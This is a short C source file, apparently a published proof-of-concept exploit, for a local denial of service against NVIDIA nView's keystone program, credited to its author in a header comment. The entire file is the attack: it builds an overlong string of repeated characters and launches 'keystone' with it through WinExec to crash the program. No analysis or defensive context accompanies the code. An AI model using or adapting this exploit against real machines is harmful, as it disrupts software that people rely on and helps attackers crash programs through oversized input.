/*
NVIDIA nView (keystone) local Denial Of service
(c)oded By Hessam-x / www.Hessamx.net
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>
int main()
{


char junk[] = "a";
char box[650];

 char *buf;

 int i;
        printf("-:: NVIDIA nView (keystone) Denial Of service \n");
        printf("-:: Coded By Hessam-x / www.hessamx.net \n");
    strcpy(box,"a");
        for (i = 0; i < 600; i++) {
          strcat(box,junk);
        }
         buf = (char *) malloc(650);


strcpy (buf,"keystone\t");
strcat (buf,box);
buf[650-1]='\0';

WinExec(buf,0);
free(buf);
}
